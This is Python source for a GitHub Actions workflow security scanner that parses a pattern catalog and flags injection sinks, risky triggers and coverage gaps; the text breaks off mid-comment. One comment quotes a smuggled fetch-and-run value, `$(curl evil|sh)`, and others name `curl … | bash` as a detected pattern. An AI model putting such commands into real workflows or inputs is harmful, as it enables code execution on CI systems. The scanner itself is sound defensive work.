#!/usr/bin/env python3
"""ci-secure scanner.

Parses METADATA blocks out of references/security-patterns.md, applies the
declared detectors against workflow YAML files in the current repo, and
emits a JSON document on stdout describing the findings. See the catalog's
"METADATA schema" section for the supported detector types.

Usage:
    scan.py [--catalog PATH] [--root PATH] [--repo OWNER/REPO]
            [--gh-impostor auto|on|off]

`--gh-impostor` gates the one network-gated detector (P14.11). `auto`
(the default) runs it iff `gh` is authenticated; `on` requires it; `off`
skips it. Every outcome is recorded in the output's `gh_checks` — a skip
is never silence.

Exit codes:
    0  success (with or without findings)
    1  scanner error — a coverage failure, never a clean result: catalog
       parse/validation failure, no workflows directory, or workflow files
       that exist on disk but were not discovered
    2  invalid arguments — a malformed `--repo`, OR `--gh-impostor=on`
       with no authenticated gh (the required check could not run)
"""

from __future__ import annotations

import argparse
import datetime as _dt
import fnmatch
import glob
import json
import os
import re
import shlex
import subprocess
import sys
import time
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path
from typing import Any, Iterator, Literal, TypedDict, get_args

Severity = Literal["HIGH", "MEDIUM", "LOW", "MANUAL"]
Detector = Literal[
    "regex",
    "yaml-path",
    "yaml-path-absent",
    "yaml-on-trigger",
    "yaml-run-injection",
    "yaml-job-correlated",       # two predicates that must coexist on one job
    "yaml-workflow-correlated",  # two predicates that must coexist at workflow scope
    "repo-file-check",           # reads a file outside .github/workflows/
    "gh-impostor-sha",           # the one NETWORK-GATED detector: verifies each
                                 # unique `uses: owner/repo@<40-hex>` pin against
                                 # the GitHub API (does the canonical repo contain
                                 # this commit?). Runs only when gh is
                                 # authenticated; scan output records ran/skipped
                                 # so a skip is never a silent pass.
    "manual",                    # documentation-only: never scanned. Coverage
                                 # is provided out-of-band (human review); the
                                 # catalog entry exists for reference.
]


class Finding(TypedDict):
    """Required base shape of a single finding emitted to the report.

    ``total=True`` (the default) deliberately: these eleven keys are
    emitted by the scan producer, so the
    type says what the prose used to only describe — a finding without,
    say, ``severity`` or ``line`` is malformed, not merely "optional".
    ``report.py`` validates incoming findings against this contract at its
    JSON-load boundary (``_validate_findings``) and surfaces violations
    loudly rather than rendering them with silent defaults (severity →
    MANUAL, line → 0), which would bury a real finding at the bottom of the
    report. Optional, producer-specific keys live on ``FindingExtra``.
    """
    id: str
    pattern: str
    severity: Severity
    title: str
    workflow_file: str
    line: int
    affected_jobs: list[str]
    workflow_activity: dict[str, Any]
    evidence: str
    fix_strategy: str
    fix_recipe_anchor: str


class FindingExtra(Finding, total=False):
    """``Finding`` plus the keys some producers add. All optional."""
    # Merged onto every member of a group by the orchestrator at runtime
    # (SKILL.md Phase 2.5): the repo-grounded exploitation scenario the
    # report renders as its "What an attacker could do" row. Absent → the
    # report falls back to the catalog's static capability line.
    attacker_scenario: str
    audit_id: str
    audit_url: str
    # "source" (evidence quotes the workflow verbatim) or "derived" (evidence
    # is a claim the scanner assembled about the file — the correlated chain
    # detectors state two facts that coexist). Absent is read as "source".
    evidence_kind: str

try:
    import yaml  # PyYAML
except ImportError:
    print(
        "ERROR: PyYAML is required. Install with: pip install pyyaml",
        file=sys.stderr,
    )
    sys.exit(1)

# Allow `from config import ...` and `from gh_utils import ...` regardless
# of where this script is invoked from.
_THIS_DIR = Path(__file__).resolve().parent
if str(_THIS_DIR) not in sys.path:
    sys.path.insert(0, str(_THIS_DIR))

from config import (  # noqa: E402
    ACTIVITY_RUN_LIMIT,
    DORMANT_DAYS,
    setup_logging,
)

logger = setup_logging(__name__)


# A METADATA block is an HTML comment beginning with `<!-- METADATA` on its
# own line and ending with `-->`. Each line is `key: value`. The block is
# attached to the most recent `### Pxx.y` heading.
_PATTERN_HEADING = re.compile(r"^###\s+(P\d+(?:\.\d+)?)\s+", re.MULTILINE)
_PATTERN_HEADING_FULL = re.compile(r"^###\s+(.+?)\s*$", re.MULTILINE)
_METADATA_BLOCK = re.compile(
    r"<!--\s*METADATA\s*(.*?)\s*-->",
    re.DOTALL,
)
# Characters that survive GitHub's heading-slug algorithm. Anything outside
# this set is dropped, then spaces are converted to hyphens. Mirrors the
# behavior of GitHub's blob renderer for `###`-style anchors.
_SLUG_KEEP = re.compile(r"[^a-z0-9 \-_]")


_VALID_SEVERITIES = frozenset(get_args(Severity))
_VALID_DETECTORS = frozenset(get_args(Detector))


@dataclass(frozen=True)
class CatalogEntry:
    pattern: str
    severity: Severity
    detector: Detector
    affected_files: list[str]
    fix_strategy: str
    title_template: str
    match: str | None = None
    yaml_path: str | None = None
    yaml_value: str | None = None
    trigger_keys: list[str] | None = None
    # New: named correlation/check identifier for the three new
    # detector classes. Each names a Python function in scan.py's
    # CORRELATION / FILE_CHECK dispatch tables — keeps METADATA
    # short while letting the catalog opt into specific predicates.
    correlation: str | None = None
    file_check: str | None = None
    anchor: str = ""

    def __post_init__(self) -> None:
        if self.severity not in _VALID_SEVERITIES:
            raise ValueError(
                f"Pattern {self.pattern}: unknown severity {self.severity!r}"
            )
        if self.detector not in _VALID_DETECTORS:
            raise ValueError(
                f"Pattern {self.pattern}: unknown detector {self.detector!r}"
            )
        if self.detector in ("regex", "yaml-run-injection") and not self.match:
            raise ValueError(
                f"Pattern {self.pattern}: {self.detector} detector requires match"
            )
        if (
            self.detector in ("yaml-path", "yaml-path-absent")
            and not self.yaml_path
        ):
            raise ValueError(
                f"Pattern {self.pattern}: {self.detector} requires yaml_path"
            )
        if self.detector == "yaml-on-trigger" and not self.trigger_keys:
            raise ValueError(
                f"Pattern {self.pattern}: yaml-on-trigger requires trigger_keys"
            )
        if (
            self.detector
            in ("yaml-job-correlated", "yaml-workflow-correlated")
            and not self.correlation
        ):
            raise ValueError(
                f"Pattern {self.pattern}: {self.detector} requires correlation"
            )
        if self.detector == "repo-file-check" and not self.file_check:
            raise ValueError(
                f"Pattern {self.pattern}: repo-file-check requires file_check"
            )

    @property
    def affected_globs(self) -> list[str]:
        return [g.strip() for g in self.affected_files if g.strip()]


def _parse_metadata_block(body: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for raw_line in body.splitlines():
        line = raw_line.strip()
        if not line or ":" not in line:
            continue
        key, _, value = line.partition(":")
        out[key.strip()] = value.strip().strip('"')
    return out


def _github_slug(heading_text: str) -> str:
    """Reproduce GitHub's heading-anchor slug algorithm.

    GitHub lowercases the heading, drops every character outside
    ``[a-z0-9 _-]``, then replaces spaces with hyphens. Em-dashes and
    other punctuation become empty strings, which often produces visible
    double-hyphens (e.g. ``p148--id-token-write-...``).
    """
    text = heading_text.lower()
    text = _SLUG_KEEP.sub("", text)
    return text.replace(" ", "-")


def _anchor_for(pattern: str, heading_text: str) -> str:
    """Return the GitHub-style anchor for a catalog pattern heading.

    Always derived from the full heading text so cross-links resolve
    against GitHub's rendered anchor (e.g. ``p148--id-token-write-...``)
    rather than the bare pattern id.
    """
    return _github_slug(heading_text)


class CoverageError(RuntimeError):
    """A scan could not cover what it claims to cover.

    Raised — never swallowed — when the scanner would otherwise emit a
    result that reads as clean while a check silently did not happen: a
    catalog entry that failed to load (its chain would simply vanish from
    the report), or workflow files that exist on disk but were not
    discovered. ``main()`` turns it into exit 1.
    """


def load_catalog(catalog_path: Path) -> list[CatalogEntry]:
    """Parse every ``### Pxx.y`` section's METADATA block into a CatalogEntry.

    STRICT by construction: a section that fails to yield a valid entry
    raises instead of being skipped. A dropped entry is invisible in the
    output — the chain is simply never evaluated and the report says
    "clean" — so a one-character METADATA typo would silently delete a
    detector. Failing the whole load makes that a loud coverage failure.
    """
    if not catalog_path.exists():
        raise FileNotFoundError(f"Catalog not found at {catalog_path}")

    text = catalog_path.read_text(encoding="utf-8")

    headings: list[tuple[str, int]] = [
        (m.group(1), m.start()) for m in _PATTERN_HEADING.finditer(text)
    ]
    if not headings:
        raise ValueError(f"No pattern headings found in {catalog_path}")

    section_bounds: list[tuple[str, int, int]] = []
    for i, (pattern, start) in enumerate(headings):
        end = headings[i + 1][1] if i + 1 < len(headings) else len(text)
        section_bounds.append((pattern, start, end))

    entries: list[CatalogEntry] = []
    for pattern_id, start, end in section_bounds:
        section = text[start:end]
        heading_match = _PATTERN_HEADING_FULL.search(section)
        heading_text = heading_match.group(1).strip() if heading_match else pattern_id
        m = _METADATA_BLOCK.search(section)
        if not m:
            raise ValueError(
                f"Pattern {pattern_id}: no METADATA block — the section cannot "
                f"be scanned"
            )
        meta = _parse_metadata_block(m.group(1))
        if meta.get("pattern") and meta["pattern"] != pattern_id:
            raise ValueError(
                f"Pattern {pattern_id}: heading mismatches METADATA pattern "
                f"{meta['pattern']}"
            )

        affected_files = [
            g.strip()
            for g in (meta.get("affected_files") or "").split(",")
            if g.strip()
        ]
        trigger_keys: list[str] | None = None
        raw_trigger_keys = meta.get("trigger_keys")
        if raw_trigger_keys:
            trigger_keys = [k.strip() for k in raw_trigger_keys.split(",") if k.strip()]

        try:
            entries.append(
                CatalogEntry(
                    pattern=pattern_id,
                    severity=meta.get("severity", "MANUAL"),
                    # No default for `detector`: a missing key is a real
                    # catalog bug, and the KeyError below is re-raised as a
                    # ValueError naming the pattern rather than a silent
                    # post-init validation failure on an inscrutable
                    # `"manual"` string that's no longer a valid value.
                    detector=meta["detector"],
                    affected_files=affected_files,
                    fix_strategy=meta.get("fix_strategy", ""),
                    title_template=meta.get(
                        "title_template", "Finding in {basename}"
                    ),
                    match=meta.get("match"),
                    yaml_path=meta.get("yaml_path"),
                    yaml_value=meta.get("yaml_value"),
                    trigger_keys=trigger_keys,
                    correlation=meta.get("correlation"),
                    file_check=meta.get("file_check"),
                    anchor=_anchor_for(pattern_id, heading_text),
                )
            )
        except KeyError as e:
            raise ValueError(
                f"Pattern {pattern_id}: METADATA missing required key {e}"
            ) from e

    # Catalog-load-time validation: reject entries whose
    # correlation/file_check identifier doesn't resolve to a real
    # dispatch function. The tables are defined later in this module,
    # but `_validate_catalog_dispatch` is called only at load time so
    # they're populated by then.
    return _validate_catalog_dispatch(entries)


def discover_workflow_files(root: Path, globs: list[str]) -> list[Path]:
    """Resolve ``globs`` under ``root``.

    ``root`` is escaped: it is a filesystem path, not a pattern, and a
    literal glob metacharacter in a directory name (``/tmp/repo[1]/``) would
    otherwise be interpreted as a character class and match nothing — every
    workflow silently invisible, the scan "clean".
    """
    seen: set[Path] = set()
    root_pattern = glob.escape(str(root))
    for pattern in globs:
        for match in glob.glob(os.path.join(root_pattern, pattern), recursive=True):
            p = Path(match).resolve()
            if p.is_file():
                seen.add(p)
    return sorted(seen)


def all_workflow_files(root: Path) -> list[Path]:
    # The `.*` patterns are not redundant: `glob` refuses to match a leading
    # dot with `*`, so a dot-prefixed workflow (`.test.yml`, as moby ships)
    # was invisible to discovery while the coverage tripwire's directory
    # listing — the ground truth — saw it, and the whole repo was refused.
    return discover_workflow_files(
        root,
        [
            ".github/workflows/*.yml", ".github/workflows/*.yaml",
            ".github/workflows/.*.yml", ".github/workflows/.*.yaml",
        ],
    )


def _undiscovered_workflows(root: Path, discovered: list[Path]) -> list[str]:
    """Workflow files present in ``.github/workflows/`` that discovery missed.

    Discovery returning nothing where the directory plainly holds workflow
    YAML is not an empty repo — it is a broken scan that would render as a
    clean one. Compared by resolved path so a symlinked or escaped root
    can't produce a phantom mismatch.
    """
    wf_dir = root / ".github" / "workflows"
    if not wf_dir.is_dir():
        return []
    found = {p.resolve() for p in discovered}
    try:
        listed = sorted(
            p for p in wf_dir.iterdir()
            if p.is_file() and p.suffix in (".yml", ".yaml")
        )
    except OSError as e:
        logger.warning("could not list %s: %s", wf_dir, e)
        return []
    return [p.name for p in listed if p.resolve() not in found]


@dataclass(frozen=True)
class RawHit:
    """An immutable detector hit. Produced by a detector generator and
    consumed straight into a ``Finding`` dict — never mutated — so it's
    frozen, matching the sibling ``CatalogEntry``."""
    line: int
    evidence: str
    match_text: str
    # True when `evidence` is a sentence this scanner SYNTHESIZED about the
    # workflow (the correlated chain detectors state two facts that coexist)
    # rather than lines quoted verbatim from the file. The report must not
    # dress a derived claim as quoted source — a reader who opens the file
    # looking for that text does not find it.
    derived: bool = False
    # An optional SECOND claim, always derived, rendered under the verbatim
    # evidence and labelled as assembled-by-the-scanner. It exists for a
    # detector whose finding is "this quoted line, *because of* a condition
    # elsewhere in the job" (P14.25: an install command is only a finding when
    # the same job holds secrets or a write scope). Folding that condition into
    # `evidence` would either lose the verbatim quote or dress the derived half
    # as source; a separate field keeps both honest.
    derived_note: str | None = None


def detect_regex(file_path: Path, pattern: str) -> Iterator[RawHit]:
    content = _read_text_safe(file_path)
    if not content:
        return
    lines = content.splitlines()
    compiled = re.compile(pattern, re.MULTILINE)
    for m in compiled.finditer(content):
        line_no = content.count("\n", 0, m.start()) + 1
        idx = line_no - 1
        start = max(0, idx - 1)
        stop = min(len(lines), idx + 2)
        evidence_lines = []
        for i in range(start, stop):
            marker = " <-- here" if i == idx else ""
            evidence_lines.append(f"{i + 1:>4}: {lines[i]}{marker}")
        yield RawHit(
            line=line_no,
            evidence="\n".join(evidence_lines),
            match_text=m.group(0),
        )


def _walk_yaml_path(node: Any, parts: list[str]) -> Iterator[Any]:
    if not parts:
        yield node
        return
    head, *rest = parts
    if isinstance(node, dict):
        if head == "*":
            for v in node.values():
                yield from _walk_yaml_path(v, rest)
        elif head in node:
            yield from _walk_yaml_path(node[head], rest)
    elif isinstance(node, list) and head == "*":
        for item in node:
            yield from _walk_yaml_path(item, rest)


def _read_text_safe(file_path: Path) -> str:
    """Read a file as text. Logs and returns ``""`` on OSError.

    Returning ``""`` lets callers short-circuit cleanly; the warning
    keeps the failure visible so a permission-denied file isn't silently
    excluded from the scan.
    """
    try:
        return file_path.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        logger.warning("Could not read %s: %s", file_path, e)
        return ""


# Files whose parse failure has already been reported this process. Every
# detector re-parses each workflow, so one broken file printed the same
# multi-line PyYAML error seven to nine times and buried the rest of stderr.
# The file is still reported once, and still recorded as a coverage gap.
_PARSE_FAILURES_LOGGED: set[str] = set()


def _parse_yaml_text(text: str, file_path: Path, quiet: bool = False) -> Any:
    """Parse already-read YAML text. ``file_path`` is used only for logging.

    ``quiet`` is for a second pass over files the scan has already reported on
    (the scored config facts re-parse every workflow): the failure is real, but
    announcing it again tells the operator nothing new.
    """
    try:
        return yaml.safe_load(text)
    except yaml.YAMLError as e:
        key = str(file_path)
        if not quiet and key not in _PARSE_FAILURES_LOGGED:
            _PARSE_FAILURES_LOGGED.add(key)
            logger.warning("YAML parse error in %s: %s", file_path, e)
        else:
            logger.debug("YAML parse error in %s (already reported)", file_path)
        return None


def _probe_scannability(file_path: Path) -> str | None:
    """Return a coverage-gap reason if a workflow can't be fully scanned, else None.

    The per-detector early-returns (``if doc is None: return`` and the
    ``_read_text_safe`` -> ``""`` short-circuit) collapse a file that *failed*
    to read or parse into the same empty result as a file that scanned cleanly.
    For a security scanner that silently turns a missing check into a clean
    bill of health, so ``scan()`` probes every workflow once and records the
    failures in ``scan_incomplete`` so report.py can name them loudly.
    Outcomes:

    - OSError on read -> NO detector evaluated the file (gap covers all patterns).
    - ``yaml.YAMLError`` -> regex detectors still ran on the raw text, but every
      YAML-based detector (yaml-path, yaml-on-trigger, the parse half of
      yaml-run-injection, all correlations, and ``affected_jobs_for``) yielded
      nothing — the file is NOT clean for those patterns, it was never checked.
    - valid YAML but NOT a top-level mapping (a list/scalar) -> same problem:
      every YAML detector bails on ``if not isinstance(doc, dict)``, so it was
      never evaluated for those patterns; record a gap, don't call it clean.
    - readable + parses to a mapping (or a legitimately empty file) -> ``None``.
    """
    try:
        text = file_path.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        return f"unreadable — not scanned for any pattern ({e})"
    try:
        doc = yaml.safe_load(text)
    except yaml.YAMLError as e:
        # PyYAML messages span several lines (problem + context + marker);
        # collapse to one line so the report banner stays scannable.
        detail = " ".join(str(e).split())
        return (
            "YAML parse error — not scanned for any YAML-based pattern "
            f"(regex patterns still ran): {detail}"
        )
    # Valid YAML, but a top-level list/scalar rather than a workflow mapping:
    # every YAML-based detector short-circuits on `not isinstance(doc, dict)`,
    # so the file was NOT evaluated for those patterns and must not read as
    # clean. An empty file (`doc is None`) is a legitimately-empty workflow.
    if doc is not None and not isinstance(doc, dict):
        return (
            f"top-level YAML is a {type(doc).__name__}, not a workflow mapping "
            "— no YAML-based pattern was evaluated (regex patterns still ran)"
        )
    return None


def _find_line_for_top_level_key(lines: list[str], key: str) -> int | None:
    """Best-effort line number for a top-level key in pre-split YAML lines.

    Returns ``None`` when the key can't be located so callers can avoid
    pointing the user at line 1 with no real evidence. Used for evidence
    rendering on yaml-path detectors where the loader doesn't preserve
    source locations.
    """
    pattern = re.compile(rf"^\s*{re.escape(key)}\s*:")
    for i, line in enumerate(lines, start=1):
        if pattern.match(line):
            return i
    return None


def detect_yaml_path(
    file_path: Path, yaml_path: str, value_filter: str | None = None
) -> Iterator[RawHit]:
    """Fire when ``yaml_path`` resolves in the document.

    When ``value_filter`` is supplied, only fire if at least one resolved
    leaf equals it (case-insensitive, after str-cast). Lets a single
    detector ignore hardened spellings like ``id-token: none`` while
    still flagging ``id-token: write``.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return
    parts = [p for p in yaml_path.split(".") if p]
    matches = list(_walk_yaml_path(doc, parts))
    if not matches:
        return
    if value_filter is not None:
        wanted = value_filter.strip().lower()
        if not any(str(leaf).strip().lower() == wanted for leaf in matches):
            return
    lines = text.splitlines()
    # We don't have source positions from yaml.safe_load. Approximate by
    # locating the top-level key in the file.
    top_key = parts[0] if parts else ""
    located = _find_line_for_top_level_key(lines, top_key) if top_key else None
    if located is None:
        line_no = 1
        evidence = f"(matched yaml path) {yaml_path}"
    else:
        line_no = located
        end = min(len(lines), line_no + 5)
        evidence = "\n".join(
            f"{i + 1:>4}: {lines[i]}" for i in range(line_no - 1, end)
        )
    yield RawHit(
        line=line_no,
        evidence=evidence,
        match_text=yaml_path,
    )


def _get_on_node(doc: Any) -> Any:
    """Return the workflow's ``on:`` value, accounting for YAML 1.1.

    PyYAML's default loader coerces the bareword key ``on`` to the
    boolean ``True`` (YAML 1.1 inheritance), so we check both shapes.
    """
    if not isinstance(doc, dict):
        return None
    if "on" in doc:
        return doc["on"]
    if True in doc:
        return doc[True]
    return None


def _on_trigger_names(on_node: Any) -> list[str]:
    """Normalize the three legal shapes of ``on:`` to a list of trigger names.

    - ``on: push`` (string)        → ``["push"]``
    - ``on: [push, issues]`` (list) → ``["push", "issues"]``
    - ``on: { push: ..., issues: ... }`` (mapping) → ``["push", "issues"]``
    """
    if isinstance(on_node, str):
        return [on_node]
    if isinstance(on_node, list):
        return [str(item) for item in on_node if isinstance(item, str)]
    if isinstance(on_node, dict):
        return [str(key) for key in on_node.keys() if isinstance(key, str)]
    return []


def detect_yaml_on_trigger(
    file_path: Path, danger_keys: list[str]
) -> Iterator[RawHit]:
    """Fire when ``on:`` declares any trigger from a configured danger list.

    Handles all three legal ``on:`` shapes (string, list, mapping) and
    the YAML 1.1 ``on`` → ``True`` boolean coercion. Avoids the
    false-positive class that plain ``^\\s+TRIGGER:`` regex hits when
    the same word appears under ``permissions:``, ``with:``, etc.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return
    on_node = _get_on_node(doc)
    if on_node is None:
        return
    triggers = _on_trigger_names(on_node)
    danger_set = set(danger_keys)
    hit_keys = sorted(set(triggers) & danger_set)
    if not hit_keys:
        return
    lines = text.splitlines()
    for trigger in hit_keys:
        # Try to locate the trigger keyword inside the on: block. Fall
        # back to the on: header line if we can't pinpoint it.
        pattern = re.compile(rf"^\s+{re.escape(trigger)}\s*:")
        located: int | None = None
        for i, line in enumerate(lines, start=1):
            if pattern.match(line):
                located = i
                break
        if located is None:
            located = _find_line_for_top_level_key(lines, "on") or 1
            evidence = f"on: includes {trigger}"
        else:
            idx = located - 1
            start = max(0, idx - 1)
            stop = min(len(lines), idx + 2)
            evidence = "\n".join(
                f"{i + 1:>4}: {lines[i]}{' <-- here' if i == idx else ''}"
                for i in range(start, stop)
            )
        yield RawHit(line=located, evidence=evidence, match_text=trigger)


_RUN_KEY_RE = re.compile(r"^\s*-?\s*run\s*:", re.MULTILINE)

# Context fields GitHub generates itself, whose VALUE SHAPE cannot carry shell
# metacharacters: integers (`.number`, `.id`), 40-hex object ids (`.sha`,
# `.head_sha`, `.merge_commit_sha`) and booleans (`.repo.fork`, `.merged`).
# Interpolating one of these into a `run:` step is not an injection sink — no
# attacker-supplied text reaches the shell — and flagging them buried the real
# text-shaped hits (PR titles, bodies, branch names, comments, labels,
# client_payload) under noise. Everything text-shaped stays in scope.
#
# These are suffixes of a fully-qualified `github.*` context path, and
# `_is_shape_safe_expression` enforces that prefix: a bare `endswith` would
# suppress any expression that merely ends in `.sha`.
#
# `github.event.action` used to sit in a companion exact-match set. It was
# dead code: the P14.10 regex only matches `github.event.<issue|comment|
# pull_request|discussion|workflow_run|head_commit|inputs|client_payload>.*`,
# `github.event.inputs.*` and `github.head_ref`, so a bare
# `github.event.action` is never a match to suppress in the first place.
#
# `.commits` joins the integer arm: on a `pull_request` payload it is the
# commit COUNT, the same GitHub-generated integer shape as `.number`. grafana's
# `trufflehog.yml` wrote `$(( ${{ github.event.pull_request.commits }} + 2 ))`
# — arithmetic on it, which only reads at all because the value is an integer —
# and the finding rendered HIGH. (The push-event `github.event.commits` ARRAY
# is a different field and is not a P14.10 match at all: the regex only reaches
# `github.event.<issue|comment|pull_request|discussion|workflow_run|
# head_commit|inputs|client_payload>.*`.)
#
# `.author_association` is not a number but is just as shape-constrained: it is
# a CLOSED ENUM GitHub fills in (OWNER, MEMBER, COLLABORATOR, CONTRIBUTOR,
# FIRST_TIME_CONTRIBUTOR, FIRST_TIMER, MANNEQUIN, NONE). No member carries a
# shell metacharacter and no attacker can add a member, so interpolating one
# into `run:` is not an injection sink. This REVERSES a class the catalog
# previously declared in scope ("author associations" was listed among the
# text-shaped fields that stay) — react's four `shared_label_core_team_prs` /
# `*_discord_notify` findings were all this shape and all false.
# `.login` is a GitHub account/org LOGIN — `github.event.*.user.login`,
# `.sender.login`, `.repo.owner.login`, etc. GitHub enforces the login charset
# (alphanumerics and single, non-leading/trailing hyphens, ≤39 chars), so it
# cannot carry a shell metacharacter — not even the login an attacker chose for
# their own fork account. So `github.event.issue.user.login` in a `run:` block
# is not an injection sink and must not fire P14.10 HIGH (astro's headline
# finding was exactly this false positive). The `github.` prefix gate plus the
# `_ATTACKER_FILLED_PREFIXES` carve-out still apply: a `.login` under
# `client_payload.*` / `inputs.*` is caller-filled and stays in scope.
_SAFE_EXPR_SUFFIXES = (
    ".number", ".id", ".commits",
    ".sha", ".head_sha", ".merge_commit_sha",
    ".fork", ".merged",
    ".author_association",
    ".login",
)

# …but the value-shape argument only holds where GITHUB fills the field in.
# Three namespaces are filled in by whoever fired the event: `client_payload`
# is the arbitrary JSON body of a `repository_dispatch`, and both
# `github.event.inputs.*` (the legacy spelling) and the bare `inputs.*` context
# (the modern `workflow_dispatch` / `workflow_call` spelling) are caller-chosen
# inputs. A caller is free to send `{"sha": "$(curl evil|sh)"}` — the NAME says
# sha, nothing enforces the shape. So a safe-looking suffix under these
# prefixes proves nothing, and the catalog says so too. They stay in scope
# whatever they are called.
_ATTACKER_FILLED_PREFIXES = (
    "github.event.client_payload.",
    "github.event.inputs.",
    "inputs.",
)


# Matches a detector found but could not anchor to a raw line, and therefore
# did NOT report. Collected here rather than returned, because detectors are
# generators whose only channel to the caller is the RawHit stream — and a
# dropped match is the opposite of a hit. `scan()` clears this before a run and
# emits it as its OWN findings-JSON list, `dropped_matches`.
#
# It is deliberately NOT folded into `scan_incomplete`. Those two are different
# facts and everything downstream reads them differently: `scan_incomplete`
# means "this FILE could not be read or parsed", which makes every workflow-
# scoped config fact unmeasurable. A dropped match means the file parsed
# perfectly and one `run:` step inside it could not be anchored to raw lines.
# Folding the second into the first demoted every fact of a healthy repo to
# unmeasured and graded it 0.0/100 over a single folded `run: >` scalar, and
# made the banner count matches while calling them files. Coverage still
# degrades to PARTIAL on either — an unanchored step is a real hole — but the
# report says which hole it is.
# THREE channels, because "we did not scan this" and "we scanned this and
# deliberately said nothing" are opposite claims about the same step, and the
# report's loudest honesty banner ("…were NOT scanned … This is not a clean
# result") is only true of one of them:
#
#   UNANCHORED  a `run:` step a detector matched but could not tie to a raw
#               line. The banner was written for exactly this and keeps it.
#   NOT_SCANNED a real coverage gap that is NOT an unanchorable run step — a
#               computed `working-directory:`, a `ref:` chosen at run time,
#               shell that would not parse. Still not a clean result; its own
#               sentence, because the headline's wording does not describe it.
#   SUPPRESSED  a finding the scanner reached and deliberately did not report,
#               above all a fetch pinned to a full commit id. INFORMATIONAL:
#               it must never touch coverage, or a repository that did exactly
#               what the fix recipe says gets told its report is unreliable.
_KIND_UNANCHORED = "unanchored-run-step"
_KIND_NOT_SCANNED = "not-scanned"
_KIND_SUPPRESSED = "suppressed"

_DROPPED_MATCHES: list[dict[str, str]] = []


def _record_dropped_match(file_path: Path, reason: str,
                          kind: str = _KIND_UNANCHORED) -> None:
    _DROPPED_MATCHES.append(
        {"file": str(file_path), "reason": reason, "kind": kind})


def _repo_relative(path: str, root: Path) -> str:
    """A workflow path as it should appear in the report: relative to the
    audited root, and NEVER absolute.

    The report is a shareable artifact — an absolute path leaks the operator's
    filesystem layout into it. `relative_to` raises when the file genuinely
    resolves outside the root (a symlinked workflow directory), and the
    fallback there used to hand the raw absolute path straight through, so the
    one branch that needed the guard was the one branch that skipped it.
    """
    try:
        return str(Path(path).resolve().relative_to(root.resolve()))
    except ValueError:
        return os.path.relpath(str(path), str(root))


def _is_shape_safe_expression(snippet: str) -> bool:
    """Is this matched **template expression** one whose value shape rules out
    shell injection? See ``_SAFE_EXPR_SUFFIXES`` and
    ``_ATTACKER_FILLED_PREFIXES``.

    Hard-gated to text that really is a ``${{ … }}`` template expression. The
    same run-scalar detector also carries the shell-command regexes (P14.24's
    `curl … | bash`), whose matches are arbitrary shell text — and a
    suppression list written about `${{ … }}` value shapes has no jurisdiction
    there. Without this gate a future `_SAFE_EXPR_SUFFIXES` entry that happened
    to end a `curl … | bash` command would silently suppress a HIGH finding.
    Anything that is not a template expression is never shape-safe.
    """
    expr = snippet.strip()
    if not expr.startswith("${{"):
        return False
    expr = expr[3:]
    if expr.endswith("}}"):
        expr = expr[:-2]
    expr = expr.strip()
    # `${{ A || B }}` is shape-safe only when EVERY operand is. Two wrong rules
    # were tried and both lose findings:
    #   - judging the whole expression, or its LAST operand, lets a safe-shaped
    #     fallback launder a text-shaped primary — cal.com's
    #     `${{ github.head_ref || github.ref_name }}` is a branch name first and
    #     a fallback second;
    #   - judging only the FIRST operand assumes the first operand is always
    #     truthy. It is not: an event field absent on THIS event is empty, so
    #     `${{ github.event.pull_request.number || github.event.issue.title }}`
    #     resolves to the issue title on an `issues` trigger and the title
    #     reaches the shell. Same for `.merged` (false on an open PR) and any
    #     other falsy-able shape-safe field.
    # Testing every operand keeps the cal.com fix and closes both.
    operands = [p.strip() for p in expr.split("||")]
    return all(_is_shape_safe_operand(p) for p in operands if p)


_LITERAL_OPERAND_RE = re.compile(r"""^(?:'[^']*'|"[^"]*"|-?\d+(?:\.\d+)?)$""")


def _is_shape_safe_operand(expr: str) -> bool:
    """One `||` operand of a template expression, judged on its own."""
    # A quoted string or a number literal is author-written, not attacker text:
    # `${{ github.event.pull_request.title || '' }}` is unsafe because of the
    # TITLE, and the `''` must not be what decides it either way.
    if _LITERAL_OPERAND_RE.match(expr):
        return True
    if expr.startswith(_ATTACKER_FILLED_PREFIXES):
        return False
    # Anchored to a fully-qualified `github.*` context path. A bare
    # `endswith` would suppress ANY text ending in `.sha` — including
    # attacker-controlled text that merely looks like a context path.
    if not expr.startswith("github."):
        return False
    return expr.endswith(_SAFE_EXPR_SUFFIXES)


def detect_yaml_run_injection(
    file_path: Path, pattern: str
) -> Iterator[RawHit]:
    """Apply a regex only to the text of ``jobs.*.steps.*.run`` scalars.

    Avoids the false-positive class where the same template expression
    appears inside ``with:`` (action input) or ``env:`` (env var) blocks
    — those don't expose shell. The regex is meant for shell-injection
    sinks, and only ``run:`` scalars are shell.

    Line numbers are computed by walking a forward-only cursor through
    the file: for each step's run scalar, the cursor advances past the
    next ``run:`` key in the file before snippet search starts. This
    keeps the same template expression appearing earlier (in ``env:``
    or ``with:``) from stealing the line attribution of the real
    shell sink.

    The parsed step list can be LONGER than the file's raw ``run:`` tokens —
    a YAML alias (``steps: *common``) expands into as many parsed steps as the
    anchor holds while contributing no new raw ``run:`` line. Once the cursor
    passes the last raw token, every remaining run scalar is unanchorable, so
    those steps are recorded as dropped matches (a coverage gap the report
    names) rather than skipped in silence — silence rendered as complete
    coverage over steps nothing ever scanned.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return
    compiled = re.compile(pattern)
    lines = text.splitlines()
    triggers = _on_trigger_names(_get_on_node(doc))
    file_cursor = 0
    unanchored_reported = False
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            run_text = step.get("run")
            if not isinstance(run_text, str):
                continue
            run_anchor = _RUN_KEY_RE.search(text, file_cursor)
            if run_anchor is None:
                # Unable to locate the run: key textually — we cannot scan
                # this step's shell without risking attribution to an earlier
                # non-run occurrence. This is a HOLE, not a clean step, so it
